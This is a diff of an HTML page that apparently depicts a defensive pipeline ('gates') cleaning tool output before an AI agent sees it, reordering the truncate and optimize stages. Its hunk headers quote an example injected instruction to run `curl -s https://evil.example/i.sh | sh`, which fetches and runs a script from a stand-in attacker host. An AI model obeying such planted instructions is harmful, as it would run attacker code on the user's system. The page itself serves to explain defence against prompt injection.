@@ -160,8 +160,8 @@ to run `curl -s https://evil.example/i.sh | sh`</span>
     <div class="gates-stage" data-step="6">
       <ol class="gate-rail">
         <li class="gate-station" data-gate="1"><span class="station-name">Strip ANSI</span><span class="station-note">escape codes deleted, text kept</span></li>
-        <li class="gate-station" data-gate="2"><span class="station-name">Truncate</span><span class="station-note">2,801 noise lines dropped, head and tail kept</span></li>
-        <li class="gate-station" data-gate="3"><span class="station-name">Optimize</span><span class="station-note">cargo-aware: warnings collapsed, result kept</span></li>
+        <li class="gate-station" data-gate="2"><span class="station-name">Optimize</span><span class="station-note">cargo-aware: warnings collapsed, result kept</span></li>
+        <li class="gate-station" data-gate="3"><span class="station-name">Truncate</span><span class="station-note">2,801 noise lines dropped, head and tail kept</span></li>
         <li class="gate-station" data-gate="4"><span class="station-name">Redact secrets</span><span class="station-note">AWS key → [REDACTED:aws-secret]</span></li>
         <li class="gate-station" data-gate="5"><span class="station-name">Neutralize injections</span><span class="station-note">instruction line disarmed</span></li>
         <li class="gate-station" data-gate="6"><span class="station-name">Wrap untrusted</span><span class="station-note">output fenced as untrusted input</span></li>
@@ -187,8 +187,8 @@ to run `curl -s https://evil.example/i.sh | sh`</span>
       <div class="gate-captions" aria-hidden="true">
         <p class="gate-caption" data-for="0">Raw output enters the wall.</p>
         <p class="gate-caption" data-for="1">Gate I. ANSI escape codes stripped.</p>
-        <p class="gate-caption" data-for="2">Gate II. Noise truncated, head and tail preserved.</p>
-        <p class="gate-caption" data-for="3">Gate III. Command-aware optimizer compacts what remains.</p>
+        <p class="gate-caption" data-for="2">Gate II. Command-aware optimizer compacts recognized output.</p>
+        <p class="gate-caption" data-for="3">Gate III. Remaining noise truncated, head and tail preserved.</p>
         <p class="gate-caption" data-for="4">Gate IV. Secrets redacted before they leave the machine.</p>
         <p class="gate-caption" data-for="5">Gate V. Injected instructions neutralized.</p>
         <p class="gate-caption" data-for="6">Gate VI. The result is fenced as untrusted input.</p>
